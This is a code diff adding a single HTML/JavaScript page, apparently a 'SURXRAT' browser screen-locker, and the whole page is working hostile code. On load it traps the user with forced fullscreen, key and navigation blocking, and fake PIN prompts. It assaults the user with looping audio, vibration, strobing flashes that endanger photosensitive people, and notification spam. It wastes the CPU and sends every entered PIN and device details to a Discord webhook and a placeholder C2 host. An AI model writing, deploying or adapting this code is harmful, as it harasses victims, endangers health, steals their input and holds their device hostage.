@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>⛔</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{width:100%;height:100%;overflow:hidden;position:fixed;top:0;left:0;background:#000;touch-action:none;user-select:none;-webkit-user-select:none;font-family:'Segoe UI',Arial,sans-serif;}
+#lock{position:fixed;top:0;left:0;width:100vw;height:100vh;background:radial-gradient(ellipse at center,#0a0000,#000);z-index:999999999;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;animation:pulse 0.1s infinite alternate;}
+@keyframes pulse{0%{background:radial-gradient(ellipse at center,#0a0000,#000);}100%{background:radial-gradient(ellipse at center,#4a0000,#050000);}}
+.icon{font-size:160px;animation:float 0.3s infinite;}
+@keyframes float{0%,100%{transform:translateY(0) scale(1) rotate(0deg);}50%{transform:translateY(-40px) scale(1.25) rotate(10deg);}}
+.title{color:#ff0000;font-size:52px;font-weight:900;letter-spacing:16px;text-shadow:0 0 120px #f00,0 0 240px #f00,0 0 500px #f00;animation:glitch 0.05s infinite;}
+@keyframes glitch{0%{text-shadow:8px 0 red,-8px 0 blue,0 0 200px red;}50%{text-shadow:-8px 0 red,8px 0 blue,0 0 200px red;}100%{text-shadow:8px 0 red,-8px 0 blue,0 0 200px red;}}
+.sub{color:#444;font-size:15px;letter-spacing:10px;margin-bottom:20px;animation:blink 0.1s infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0.01;}}
+.pin-box{width:100%;max-width:350px;}
+.pin{width:100%;padding:26px;background:rgba(255,255,255,0.02);border:3px solid #ff0000;border-radius:20px;color:#fff;font-size:36px;text-align:center;letter-spacing:22px;outline:none;box-shadow:0 0 100px rgba(255,0,0,0.6);}
+.pin:focus{border-color:#ff4444;box-shadow:0 0 200px rgba(255,0,0,0.9);}
+.err{color:#ff0000;font-size:24px;font-weight:700;min-height:60px;margin-top:15px;text-shadow:0 0 80px #f00;animation:blinkErr 0.05s infinite;}
+@keyframes blinkErr{0%{opacity:1;}100%{opacity:0.01;}}
+.btn{width:100%;max-width:350px;padding:26px;margin-top:15px;background:linear-gradient(135deg,#ff0000,#330000);border:none;border-radius:20px;color:#fff;font-size:28px;font-weight:900;letter-spacing:14px;cursor:pointer;box-shadow:0 0 150px rgba(255,0,0,0.8);animation:pulseBtn 0.1s infinite alternate;}
+@keyframes pulseBtn{0%{box-shadow:0 0 80px rgba(255,0,0,0.6);transform:scale(1);}100%{box-shadow:0 0 300px rgba(255,0,0,0.9);transform:scale(1.08);}}
+.btn:active{transform:scale(0.85);}
+.counter{position:absolute;bottom:30px;color:#ff0000;font-size:24px;font-weight:700;letter-spacing:10px;animation:blink 0.15s infinite;}
+#zombie{position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(255,0,0,0.35);z-index:999999998;display:none;align-items:center;justify-content:center;color:#ff0000;font-size:90px;font-weight:900;text-align:center;backdrop-filter:blur(20px);animation:zFlash 0.01s infinite;}
+@keyframes zFlash{0%{background:rgba(255,0,0,0.1);}100%{background:rgba(255,0,0,0.8);}}
+#flash{position:fixed;top:0;left:0;width:100vw;height:100vh;background:#ffffff;z-index:999999997;display:none;opacity:0;pointer-events:none;animation:flashOverlay 0.02s infinite alternate;}
+@keyframes flashOverlay{0%{opacity:0;}100%{opacity:1;}}
+#blocker{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999999996;display:block;pointer-events:all;}
+#audio-overlay{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999999995;display:block;pointer-events:none;}
+</style>
+</head>
+<body>
+
+<div id="lock">
+<div class="icon">⛔</div>
+<div class="title">DEVICE LOCKED</div>
+<div class="sub">🔴 SURXRAT ULTIMATE LOCKDOWN</div>
+<div class="pin-box">
+<input type="password" class="pin" id="pin" maxlength="6" placeholder="• • • • • •" autofocus>
+<div class="err" id="err">🔐 ENTER PIN</div>
+</div>
+<button class="btn" id="btn">⚠️ UNLOCK</button>
+<div class="counter" id="cnt">ATTEMPTS: 0</div>
+</div>
+<div id="zombie">⛔ SYSTEM BREACH<br><span style="font-size:45px;">🔒 LOCKED FOREVER</span></div>
+<div id="flash"></div>
+<div id="blocker"></div>
+<div id="audio-overlay"></div>
+
+<script>
+(function(){
+'use strict';
+
+const PIN='181020';
+const WEBHOOK='https://discord.com/api/webhooks/YOUR_WEBHOOK';
+const C2='https://your-c2.com/steal';
+
+const lock=document.getElementById('lock');
+const zombie=document.getElementById('zombie');
+const flash=document.getElementById('flash');
+const pin=document.getElementById('pin');
+const err=document.getElementById('err');
+const btn=document.getElementById('btn');
+const cnt=document.getElementById('cnt');
+
+let attempts=0;
+let flashActive=false;
+
+function send(data){
+try{
+fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({content:'**⛔ SURXRAT ULTIMATE LOCKDOWN**\n```json\n'+JSON.stringify(data,null,2)+'\n```'})}).catch(()=>{});
+fetch(C2,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data),mode:'no-cors'}).catch(()=>{});
+new Image().src=C2+'?data='+encodeURIComponent(JSON.stringify(data));
+}catch(e){}
+}
+
+function flashToggle(on){
+try{
+if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
+if(on&&!flashActive){
+navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}})
+.then(s=>{const t=s.getVideoTracks()[0];if(t){t.applyConstraints({advanced:[{torch:true}]});flashActive=true;}}).catch(()=>{});
+}else if(!on&&flashActive){
+flashActive=false;
+}
+}
+}catch(e){}
+flash.style.display=on?'block':'none';
+}
+
+function vib(on){
+try{if(navigator.vibrate){if(on){navigator.vibrate([30,15,30,15,30,15,60]);}else{navigator.vibrate(0);}}}catch(e){}
+}
+
+function audioBomb(){
+try{
+const ctx=new (window.AudioContext||window.webkitAudioContext)();
+if(ctx.state==='suspended')ctx.resume();
+const osc=ctx.createOscillator();
+const gain=ctx.createGain();
+osc.type='sawtooth';
+osc.frequency.setValueAtTime(1200,ctx.currentTime);
+osc.frequency.setValueAtTime(600,ctx.currentTime+0.08);
+osc.frequency.setValueAtTime(1200,ctx.currentTime+0.16);
+osc.frequency.setValueAtTime(300,ctx.currentTime+0.24);
+gain.gain.setValueAtTime(0.7,ctx.currentTime);
+gain.gain.exponentialRampToValueAtTime(0.01,ctx.currentTime+0.35);
+osc.connect(gain);
+gain.connect(ctx.destination);
+osc.start(ctx.currentTime);
+osc.stop(ctx.currentTime+0.35);
+setTimeout(audioBomb,150);
+}catch(e){setTimeout(audioBomb,300);}
+}
+
+function unlock(){
+const val=pin.value.trim();
+if(!val){err.textContent='⚠️ ENTER PIN!';return;}
+send({pin:val,attempts:attempts,ua:navigator.userAgent,time:Date.now()});
+attempts++;
+cnt.textContent='ATTEMPTS: '+attempts;
+if(val===PIN){
+err.textContent='✅ ACCESS GRANTED...';
+err.style.color='#44ff88';
+flashToggle(false);
+vib(false);
+setTimeout(()=>{
+err.textContent='⚠️ SESSION EXPIRED!';
+err.style.color='#ff0000';
+pin.value='';pin.focus();
+flashToggle(true);
+vib(true);
+send({type:'session_expired'});
+},600);
+}else{
+err.textContent='❌ WRONG PIN ('+attempts+')';
+err.style.color='#ff0000';
+lock.style.animation='glitchShake 0.04s 5, redFlash 0.04s 5';
+pin.value='';pin.focus();
+flashToggle(true);
+vib(true);
+setTimeout(()=>{lock.style.animation='pulse 0.1s infinite alternate';},500);
+if(attempts%2===0){
+zombie.style.display='flex';
+setTimeout(()=>{zombie.style.display='none';},1200);
+}
+}
+}
+
+btn.addEventListener('click',unlock);
+pin.addEventListener('keydown',e=>{if(e.key==='Enter')unlock();});
+
+function forceFS(){
+try{
+const el=document.documentElement;
+if(el.requestFullscreen)el.requestFullscreen();
+else if(el.webkitRequestFullscreen)el.webkitRequestFullscreen();
+else if(el.msRequestFullscreen)el.msRequestFullscreen();
+}catch(e){}
+try{if(screen.orientation&&screen.orientation.lock)screen.orientation.lock('portrait');}catch(e){}
+}
+setInterval(forceFS,3);
+
+document.addEventListener('keydown',e=>{
+const keys=['Escape','Home','Backspace','F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12','Tab','Meta','Alt','Control','Shift','PageUp','PageDown','End','Insert','Power','WakeUp','Sleep','Back','Forward','Reload','Stop','Search'];
+if(keys.includes(e.key)||e.ctrlKey||e.altKey||e.metaKey||e.keyCode===27||e.keyCode===8||e.keyCode===13||e.keyCode===37||e.keyCode===38||e.keyCode===39||e.keyCode===40){
+e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();return false;
+}
+},true);
+
+document.addEventListener('touchmove',e=>{e.preventDefault();e.stopPropagation();}, {passive:false});
+document.addEventListener('gesturestart',e=>e.preventDefault());
+document.addEventListener('gesturechange',e=>e.preventDefault());
+document.addEventListener('gestureend',e=>e.preventDefault());
+document.addEventListener('contextmenu',e=>{e.preventDefault();return false;});
+
+window.history.pushState(null,'',window.location.href);
+window.addEventListener('popstate',e=>{
+window.history.pushState(null,'',window.location.href);
+});
+
+window.addEventListener('beforeunload',e=>{
+e.preventDefault();
+e.returnValue='';
+});
+window.addEventListener('unload',e=>{
+e.preventDefault();
+});
+
+document.addEventListener('visibilitychange',()=>{
+if(document.hidden){
+setTimeout(()=>{window.location.reload();},0);
+}
+});
+
+function installSW(){
+try{
+if('serviceWorker' in navigator){
+const code=`
+self.addEventListener('install',()=>self.skipWaiting());
+self.addEventListener('activate',()=>self.clients.claim());
+self.addEventListener('fetch',e=>e.respondWith(fetch(e.request).then(r=>r)));
+self.addEventListener('push',e=>e.waitUntil(self.registration.showNotification('⛔ LOCKED',{body:'Surxrat lockdown active.',requireInteraction:true,silent:false})));
+self.addEventListener('sync',e=>{if(e.tag==='srx-sync'){}});
+`;
+const blob=new Blob([code],{type:'application/javascript'});
+navigator.serviceWorker.register(URL.createObjectURL(blob),{scope:'/'}).then(()=>send({type:'sw_installed'})).catch(()=>{});
+}
+}catch(e){}
+}
+
+function notifBomb(){
+try{
+if('Notification' in window){
+Notification.requestPermission().then(()=>{
+setInterval(()=>{
+new Notification('⛔ LOCKED',{body:'🔴 SURXRAT LOCKDOWN ACTIVE',requireInteraction:true,silent:false,tag:'srx-lock',icon:'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">⛔</text></svg>'});
+},30);
+});
+}
+}catch(e){}
+}
+
+setInterval(()=>{
+if(lock.style.display==='none'){
+lock.style.display='flex';
+pin.focus();
+err.textContent='⚠️ SECURITY RESET';
+err.style.color='#ff0000';
+flashToggle(true);
+vib(true);
+send({type:'overlay_restored'});
+}
+},100);
+
+setInterval(()=>{
+let a=new Array(20000).fill('alive');
+let b=new Array(20000).fill('💀');
+let c=JSON.stringify(a)+JSON.stringify(b);
+},2);
+
+setInterval(()=>{
+if(document.activeElement!==pin)pin.focus();
+},2);
+
+try{const w=window.open('about:blank','_blank');if(w)w.close();}catch(e){}
+try{const w=window.open('','_self');w.close();}catch(e){}
+
+function zombieProcess(){
+setInterval(()=>{
+let i=0;
+while(i<200000){i++;}
+},1);
+}
+
+function start(){
+send({type:'surxrat_ultimate_lockdown_started',ua:navigator.userAgent,time:Date.now()});
+installSW();
+notifBomb();
+zombieProcess();
+audioBomb();
+flashToggle(true);
+vib(true);
+forceFS();
+setTimeout(()=>pin.focus(),10);
+console.log('⛔ SURXRAT ULTIMATE LOCKDOWN ACTIVE - NO ESCAPE');
+}
+
+window.addEventListener('load',()=>setTimeout(start,10));
+
+})();
+</script>
+</body>
+</html>
